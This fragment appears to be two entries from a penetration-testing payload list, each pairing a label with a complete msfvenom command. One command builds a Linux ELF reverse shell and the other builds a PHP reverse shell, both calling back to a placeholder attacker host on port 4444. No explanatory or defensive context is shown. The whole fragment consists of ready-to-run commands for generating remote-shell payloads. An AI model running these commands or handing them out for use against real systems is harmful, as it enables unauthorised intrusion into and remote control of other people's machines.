      ["Linux elf", "msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o shell.elf"],
      ["PHP", "msfvenom -p php/reverse_php LHOST=<IP> LPORT=4444 -f raw -o shell.php"],
